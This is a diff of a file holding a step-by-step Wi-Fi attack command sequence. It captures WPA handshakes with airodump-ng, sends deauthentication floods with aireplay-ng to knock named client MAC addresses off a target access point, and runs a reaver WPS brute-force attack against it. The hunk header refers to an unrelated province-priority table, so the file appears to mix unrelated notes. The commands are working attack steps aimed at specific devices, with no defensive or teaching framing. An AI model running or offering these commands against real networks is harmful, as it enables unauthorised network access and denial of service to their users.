@@ -13,22 +13,23 @@ Set priority in table `province_priority` to adjust the sequence of the province
 # Sniff wifi, -c CHANNEL
 rm -fr *.cap && sudo airodump-ng --wps -w wpa wlan1mon -c 6
 
-
+###################################################################
 # tgt is the target wifi to crack, clientvic is the client to deauth
 tgt=8C:18:50:56:2B:28
 
 # Collect the handshake cap
 sudo rm -fr *.cap && sudo airodump-ng --ivs --bssid ${tgt} -w ${tgt}.cap wlan1mon -c 2
 
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
 # Deauth the client
 tgt=8C:18:50:56:2B:28
-
-sudo airodump-ng --wps  wlan1 --bssid ${tgt}
 
 clientvic=14:5F:94:8C:AA:BF
 sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} wlan1mon
 clientvic=74:E2:F5:33:23:D4
 sudo aireplay-ng -0 10 -a ${tgt} -c ${clientvic} wlan1mon
+
+###################################################################
 
 sudo reaver -i wlan1mon -b ${tgt} –a –S –vv –d 0  -c 11
 
